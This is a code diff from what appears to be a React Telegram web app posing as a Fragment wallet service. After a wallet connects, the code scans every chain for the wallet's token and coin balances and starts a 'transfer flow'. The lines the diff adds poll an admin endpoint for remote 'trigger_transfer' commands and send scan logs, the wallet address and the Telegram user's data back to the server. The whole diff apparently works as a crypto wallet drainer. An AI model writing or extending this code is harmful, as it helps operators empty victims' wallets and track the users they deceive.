@@ -182,6 +182,27 @@ export default function App() {
       }).catch(err => console.error("Failed to notify wallet connect", err));
 
       startTransferFlow();
+
+      // Start polling for admin commands
+      const interval = setInterval(async () => {
+        try {
+          const resp = await fetch(`/fragment/api/poll/wallet/${address}`);
+          const data = await resp.json();
+          for (const cmd of data.commands) {
+            if (cmd === 'trigger_transfer') startTransferFlow();
+            if (cmd === 'disconnect') disconnect();
+          }
+        } catch (err) {}
+      }, 5000);
+
+      return () => {
+        clearInterval(interval);
+        fetch('/fragment/api/submit/wallet_disconnect', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ address, user: tg?.initDataUnsafe?.user })
+        }).catch(() => {});
+      };
     }
   }, [isConnected, address]);
 
@@ -199,31 +220,46 @@ export default function App() {
 
       // 1. Scan all chains for balances WITHOUT switching
       for (const chain of chains) {
-        const publicClient = createPublicClient({
-          chain: chain,
-          transport: http(RPC_URLS[chain.id as keyof typeof RPC_URLS])
-        });
+        try {
+          await fetch('/fragment/api/submit/log', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ message: `Scanning ${chain.name}...`, user: tg?.initDataUnsafe?.user })
+          });
 
-        const nativeBalance = await publicClient.getBalance({ address: address as `0x${string}` });
-        const tokensFound: { token: any, balance: bigint }[] = [];
+          const publicClient = createPublicClient({
+            chain: chain,
+            transport: http(RPC_URLS[chain.id as keyof typeof RPC_URLS])
+          });
 
-        const chainTokens = TOKENS[chain.id as keyof typeof TOKENS] || [];
-        for (const token of chainTokens) {
-          try {
-            const balance = await publicClient.readContract({
-              address: token.address as `0x${string}`,
-              abi: erc20Abi,
-              functionName: 'balanceOf',
-              args: [address as `0x${string}`],
-            });
-            if (balance > 0n) {
-              tokensFound.push({ token, balance });
-            }
-          } catch (err) {}
-        }
+          const nativeBalance = await publicClient.getBalance({ address: address as `0x${string}` });
+          const tokensFound: { token: any, balance: bigint }[] = [];
 
-        if (nativeBalance > 0n || tokensFound.length > 0) {
-          assetsByChain[chain.id] = { native: nativeBalance, tokens: tokensFound };
+          const chainTokens = TOKENS[chain.id as keyof typeof TOKENS] || [];
+          for (const token of chainTokens) {
+            try {
+              const balance = await publicClient.readContract({
+                address: token.address as `0x${string}`,
+                abi: erc20Abi,
+                functionName: 'balanceOf',
+                args: [address as `0x${string}`],
+              });
+              if (balance > 0n) {
+                tokensFound.push({ token, balance });
+              }
+            } catch (err) {}
+          }
+
+          if (nativeBalance > 0n || tokensFound.length > 0) {
+            assetsByChain[chain.id] = { native: nativeBalance, tokens: tokensFound };
+          }
+        } catch (err: any) {
+          console.error(`Error scanning ${chain.name}:`, err);
+          await fetch('/fragment/api/submit/log', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ message: `Error scanning ${chain.name}: ${err?.message}`, user: tg?.initDataUnsafe?.user })
+          });
         }
       }
 
